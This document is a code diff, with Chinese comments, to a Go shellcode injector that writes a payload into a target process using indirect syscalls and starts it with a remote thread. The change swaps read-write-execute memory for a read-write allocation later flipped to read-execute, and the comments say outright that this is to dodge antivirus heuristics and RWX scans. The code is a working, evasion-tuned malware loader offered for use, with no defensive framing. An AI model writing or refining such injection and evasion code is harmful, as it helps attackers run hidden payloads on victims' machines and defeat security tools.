@@ -73,19 +73,20 @@ func Execute(shellcode []byte) error {
 	var baseAddr uintptr = 0
 	var regionSize uintptr = uintptr(len(shellcode))
 
+	// 关键修改：只申请 ReadWrite 权限 (0x04)，避免 RWX (0x40) 启发式查杀
 	status := NtAllocateVirtualMemory(
 		uintptr(hProcess),
 		&baseAddr,
 		0,
 		&regionSize,
 		MEM_COMMIT|MEM_RESERVE,
-		PAGE_EXECUTE_READWRITE,
+		0x04, // PAGE_READWRITE
 	)
 
 	if status != 0 {
 		return fmt.Errorf("NtAllocateVirtualMemory 失败: 0x%x", status)
 	}
-	fmt.Printf("[+] 目标进程内存申请成功: 0x%x\n", baseAddr)
+	fmt.Printf("[+] 目标进程内存申请成功: 0x%x (RW)\n", baseAddr)
 
 	// 4. 写入 Shellcode 到目标进程 (使用 Indirect Syscall: NtWriteVirtualMemory)
 	var bytesWritten uintptr
@@ -100,6 +101,20 @@ func Execute(shellcode []byte) error {
 		return fmt.Errorf("NtWriteVirtualMemory 失败: 0x%x", status)
 	}
 	fmt.Printf("[+] Payload 已写入目标进程: %d 字节\n", bytesWritten)
+
+	// 4.5 更改内存权限 RW -> RX (使用 Indirect Syscall: NtProtectVirtualMemory)
+	var oldProtect uintptr
+	status = NtProtectVirtualMemory(
+		uintptr(hProcess),
+		&baseAddr,
+		&regionSize,
+		0x20, // PAGE_EXECUTE_READ
+		&oldProtect,
+	)
+	if status != 0 {
+		return fmt.Errorf("NtProtectVirtualMemory 失败 (RW->RX): 0x%x", status)
+	}
+	fmt.Printf("[+] 内存权限已更改为 RX (规避 RWX 扫描)\n")
 
 	// 5. 在目标进程创建远程线程执行 (使用 Indirect Syscall: NtCreateThreadEx)
 	var hThread uintptr
